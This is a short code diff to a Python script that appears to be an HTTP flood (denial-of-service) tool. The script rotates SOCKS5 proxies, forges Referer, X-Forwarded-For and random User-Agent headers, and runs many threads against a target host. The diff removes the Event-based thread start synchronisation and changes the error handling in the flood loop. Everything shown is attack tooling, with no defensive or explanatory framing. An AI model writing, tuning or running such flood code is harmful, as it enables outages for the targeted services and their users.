@@ -94,7 +94,7 @@ def Flood(indexPicker):
     Referer = "Referer: https://google.com?q=" + targetHost + "\r\n"
     X_Forwarded_For = f"X-Forwarded-For: {proxy[0]}, {proxy[0][::-1]}\r\n"
     User_Agent = "User-Agent: " + userAgent + "\r\n\r\n"
-    event.wait()
+
     while True:
         try:
             socks.setdefaultproxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
@@ -114,7 +114,7 @@ def Flood(indexPicker):
             except:
                 s.close()
         except:
-            s.close()
+            time.sleep(.1)
  
 if "--socksCrawler" in sys.argv:
     socksCrawler()
@@ -133,7 +133,7 @@ if "--checkProxies" in sys.argv:
 else:
     proxies = open("socks5.txt").readlines()
 userAgentList = []
-event = threading.Event()
+
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
@@ -142,4 +142,3 @@ for indexPicker in range(threadNumber):
     process.setDaemon = True
     process.start()
  
-event.set()
